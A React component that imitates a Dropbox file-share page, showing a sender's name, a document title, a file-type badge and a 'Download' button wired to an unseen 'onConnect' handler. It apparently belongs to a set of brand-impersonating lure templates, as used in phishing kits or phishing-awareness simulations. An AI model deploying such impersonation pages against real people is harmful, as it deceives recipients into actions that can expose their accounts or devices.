"use client";

import { Loader2 } from "lucide-react";

interface TemplateProps {
  documentTitle: string;
  docType: string;
  senderName: string;
  onConnect: () => void;
  connecting: boolean;
}

export default function DropboxTemplate({
  documentTitle,
  docType,
  senderName,
  onConnect,
  connecting,
}: TemplateProps) {
  return (
    <div
      style={{
        minHeight: "100vh",
        backgroundColor: "#1a1a1a",
        display: "flex",
        flexDirection: "column",
        alignItems: "center",
      }}
    >
      {/* Header */}
      <div
        style={{
          width: "100%",
          padding: "14px 24px",
          backgroundColor: "#0061FF",
          display: "flex",
          alignItems: "center",
          gap: 10,
        }}
      >
        <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
          <path d="M7 4L12 8L7 12L2 8L7 4Z" fill="#fff" />
          <path d="M17 4L22 8L17 12L12 8L17 4Z" fill="#fff" opacity="0.8" />
          <path d="M7 12L12 16L7 20L2 16L7 12Z" fill="#fff" opacity="0.8" />
          <path d="M17 12L22 16L17 20L12 16L17 12Z" fill="#fff" opacity="0.6" />
        </svg>
        <span style={{ color: "#fff", fontSize: 16, fontWeight: 600 }}>Dropbox</span>
      </div>

      {/* Content */}
      <div
        style={{
          maxWidth: 480,
          width: "100%",
          margin: "80px auto 0",
          padding: "0 16px",
        }}
      >
        <div
          style={{
            backgroundColor: "#2a2a2a",
            borderRadius: 8,
            border: "1px solid #3a3a3a",
            overflow: "hidden",
          }}
        >
          <div style={{ padding: "24px 32px 12px" }}>
            <p style={{ color: "#a0a0a0", fontSize: 13 }}>
              {senderName} sent you a file
            </p>
          </div>

          <div
            style={{
              display: "flex",
              alignItems: "center",
              gap: 16,
              padding: "16px 32px",
            }}
          >
            <div
              style={{
                width: 48,
                height: 56,
                borderRadius: 6,
                backgroundColor:
                  docType === "PDF"
                    ? "#E74C3C"
                    : docType === "DOCX"
                      ? "#2B579A"
                      : docType === "XLSX"
                        ? "#217346"
                        : docType === "PPTX"
                          ? "#D24726"
                          : "#0061FF",
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                color: "#fff",
                fontSize: 11,
                fontWeight: 700,
              }}
            >
              {docType}
            </div>
            <div>
              <p style={{ color: "#e0e0e0", fontSize: 15, fontWeight: 600 }}>
                {documentTitle}
              </p>
              <p style={{ color: "#808080", fontSize: 12, marginTop: 4 }}>
                {docType} &middot; Shared via Dropbox
              </p>
            </div>
          </div>

          <div style={{ padding: "16px 32px 24px" }}>
            <button
              onClick={onConnect}
              disabled={connecting}
              style={{
                width: "100%",
                padding: "12px 24px",
                backgroundColor: connecting ? "#004acc" : "#0061FF",
                color: "#fff",
                border: "none",
                borderRadius: 6,
                fontSize: 14,
                fontWeight: 600,
                cursor: connecting ? "not-allowed" : "pointer",
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                gap: 8,
              }}
            >
              {connecting && <Loader2 className="h-4 w-4 animate-spin" />}
              {connecting ? "Preparing..." : "Download"}
            </button>
          </div>
        </div>
      </div>
    </div>
  );
}
